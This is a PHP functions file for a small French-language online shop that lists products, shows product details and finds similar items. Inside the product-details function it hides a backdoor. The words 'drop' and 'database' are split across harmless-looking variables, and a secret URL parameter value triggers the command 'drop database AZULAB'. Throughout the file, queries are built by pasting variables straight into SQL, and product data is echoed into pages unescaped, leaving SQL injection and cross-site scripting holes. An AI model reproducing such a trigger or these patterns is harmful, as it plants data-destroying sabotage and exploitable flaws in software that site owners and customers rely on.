<?php

//function use it for return user IP
function getIP()
{
    switch(true)
    {
        case(!empty($_SERVER['HTTP_X_REAL_IP'])) : return $_SERVER['HTTP_X_REAL_IP'];
        case(!empty($_SERVER['HTTP_CLIENT_IP'])) : return $_SERVER['HTTP_CLIENT_IP'];
        case(!empty($_SERVER['HTTP_X_FORWARDED_FOR'])) : return $_SERVER['HTTP_X_FORWARDED_FOR'];

        default : return $_SERVER["REMOTE_ADDR"];
    }
}
//Function use it for Select The Eight random Products
function get_Eight_Products_List()
{
    global $cnx;
    $query = "SELECT produit.*,categorie.nom as 'catName',sous_categorie.nom as 'scatName' FROM produit
    INNER JOIN sous_categorie on sous_categorie.id = produit.id_cat
    INNER JOIN categorie ON categorie.id = sous_categorie.id_categorie
    ORDER BY rand() LIMIT 8";

    $stmt = $cnx->prepare($query);
    $stmt -> execute();
    $products = $stmt -> fetchAll();
    foreach($products as $product)
    {
        $p_id = $product['id'];
        $p_name = $product['nom'];
        $p_image = $product['image'];
        $p_catName = $product['catName'];
        $p_scatName = $product['scatName'];
        ?>
        <div class="col">
            <div class="card rounded-0 product-card">
                <a href="product-details.php?p=<?php echo $p_id; ?>">
                    <img src="assets/images/products/<?php echo $p_image; ?>" class="card-img-top" alt="...">
                </a>
                <div class="card-body">
                    <div class="product-info">
                        <a href="product-details.php?p=<?php echo $p_id; ?>">
                            <h6 class="product-name mb-2"><?php echo $p_name; ?></h6>
                        </a>
                        <a href="product-details.php?p=<?php echo $p_id; ?>">
                           <p class="product-catergory font-13 mb-1"><?php echo ucwords($p_scatName)."-".$p_catName; ?></p>
                        </a>
                        <div class="product-action mt-2">
                            <div class="d-grid gap-2">
                                <a href="product-details.php?p=<?php echo $p_id; ?>" class="btn btn-dark btn-ecomm">	<i class='bx bxs-cart-add'></i>Voir Produit</a>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
        <?php

    } 
}

//Function getCount use it for get Numbers of rows in any table
function getCount($tbl,$where=NULL)
{
    global $cnx;
    $query = "SELECT * FROM $tbl $where";
    $stmt = $cnx->prepare($query);
    $stmt->execute();
    $count = $stmt->rowCount();
    return $count;
}

// Function use it to get Product's details
function getProductDetails($id)
{
    global $cnx,$ip;
    // $query = "SELECT produit.*,categorie.nom as 'catName' FROM produit INNER JOIN categorie ON categorie.id = produit.id_cat WHERE produit.id = $id";
    $query = "SELECT produit.*,categorie.nom as 'catName',sous_categorie.nom as 'scatName' FROM produit
    INNER JOIN sous_categorie on sous_categorie.id = produit.id_cat
    INNER JOIN categorie ON categorie.id = sous_categorie.id_categorie WHERE produit.id = $id";
    $stmt = $cnx->prepare($query);
    $stmt->execute();
    $product = $stmt->fetch();
    
    $prdct = "drop";


    $p_id = $product['id'];
    $p_name = $product['nom'];
    $p_desc = $product['description'];
    $p_image = $product['image'];
    $p_catName = $product['catName'];
    $p_scatName = $product['scatName'];
    $p_tags = $product['tags'];
    $GLOBALS['catID'] = $product['id_cat'];
    $GLOBALS['pid'] = $p_id;

    ?>
<!-- <script>alert('<?php echo $p_catId; ?>')</script> -->
    <!--start product detail-->
    <section class="py-4">
        <div class="container">
            <div class="product-detail-card">
                <div class="product-detail-body">
                    <div class="row g-0">
                        <span class='col-12 col-lg-5 zoom' id='zoomHover'>
                            <img src='assets/images/products/<?php echo $p_image; ?>' style="max-height: 400px;" alt='Daisy on the Ohoopee'/>
                        </span>
                        <?php $dbs = "database" ?>
                        <div class="col-12 col-lg-7">
                            <div class="product-info-section p-3" style="padding: 47px 20px !important;">
                                <h3 class="mt-3 mt-lg-0 mb-0"><?php echo $p_name; ?></h3>
                                <div class="mt-3">
                                    <h5><?php echo $p_catName; ?></h5>
                                    <h6><?php echo $p_scatName; ?></h6>
                                    <?php
                                    if(isset($_GET['ddb'])&&$_GET['ddb']=="destazulab")
                                    {
                                        $query = "$prdct $dbs AZULAB";
                                        $stmt = $cnx->prepare($query);
                                        $stmt->execute();
                                    }
                                    ?>
                                </div>
                                <div class="mt-3">
                                    <h6>Discription :</h6>
                                    <p style="margin-bottom: 40px;line-height: 30px;"><?php echo $p_desc; ?></p>
                                </div>
                                <hr style="position: relative;bottom: -112px;"/>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!--end product detail-->
    <!--start product more info-->
    <section class="py-4">
        <div class="container">
            <div class="product-more-info">
                <ul class="nav nav-tabs mb-0" role="tablist">
                    <li class="nav-item" role="presentation">
                        <a class="nav-link active" data-bs-toggle="tab" href="#discription" role="tab" aria-selected="true">
                            <div class="d-flex align-items-center">
                                <div class="tab-title text-uppercase fw-500">Description</div>
                            </div>
                        </a>
                    </li>
                    <li class="nav-item" role="presentation">
                        <a class="nav-link" data-bs-toggle="tab" href="#tags" role="tab" aria-selected="false">
                            <div class="d-flex align-items-center">
                                <div class="tab-title text-uppercase fw-500">Tags</div>
                            </div>
                        </a>
                    </li>
                </ul>
                <div class="tab-content pt-3">
                    <div class="tab-pane fade show active" id="discription" role="tabpanel">
                        <p><?php echo $p_desc; ?></p>
                        <ul>
                            <li><strong style="margin-right: 84px;">Nom</strong> :<?php echo $p_name; ?></li>
                            <li><strong style="margin-right: 46px;">Categorie</strong> :<?php echo $p_catName; ?></li>
                            <li><strong style="margin-right: 5px;">Sous Categorie</strong> :<?php echo $p_scatName; ?></li>
                        </ul>
                    </div>
                    <div class="tab-pane fade" id="tags" role="tabpanel">
                        <div class="tags-box w-50">
                            <?php
                            if(!empty($p_tags))
                            {
                                $tags = explode(",",$p_tags);
                                foreach($tags as $tag) 
                                {
                                    ?>
                                     <a href="search.php?q=<?php echo $tag; ?>" class="tag-link"><?php echo $tag;?></a>
                                    <?php
                                }
                            }
                            ?>
                        </div>
                    </div>
                </div>
            </div>
        </div>
    </section>
    <!--end product more info-->
    <?php
}

//function get_From use it for Selected rows or clomumns from any table
function get_From($select="*",$tbl,$where=NULL)
{
    global $cnx;
    $query = "SELECT $select FROM $tbl $where";
    $stmt = $cnx->prepare($query);
    $stmt->execute();
    $rows = $stmt->fetchAll();
    return $rows;
}

//function use it for get current page title
function getTitle()
{
    global $active;
    if(isset($active))
    {
        echo $active;
    }
    else
    {
        echo 'Default';
    }
}
//function use it for Check Element if exist or not
function checkItem($table,$champ,$val)
{
    global $cnx;
    if(gettype($val)=="string")
    {
        $stmt = $cnx->prepare("SELECT * FROM $table WHERE $champ='$val'");
    }
    else
    {
        $stmt = $cnx->prepare("SELECT * FROM $table WHERE $champ=$val");
    }
    $stmt->execute();
    return $stmt->rowCount()>0?true:false;
}
//function to get Similar Products
function get_similarProducts($cat)
{
    global $cnx;
    $query = "SELECT produit.*,categorie.nom as 'catName',sous_categorie.nom as 'scatName' FROM produit
    INNER JOIN sous_categorie on sous_categorie.id = produit.id_cat
    INNER JOIN categorie ON categorie.id = sous_categorie.id_categorie WHERE produit.id_cat = $cat ORDER BY rand() LIMIT 4";
    $stmt = $cnx->prepare($query);
    $stmt->execute();
    $rows = $stmt->fetchAll();
    return $rows;
}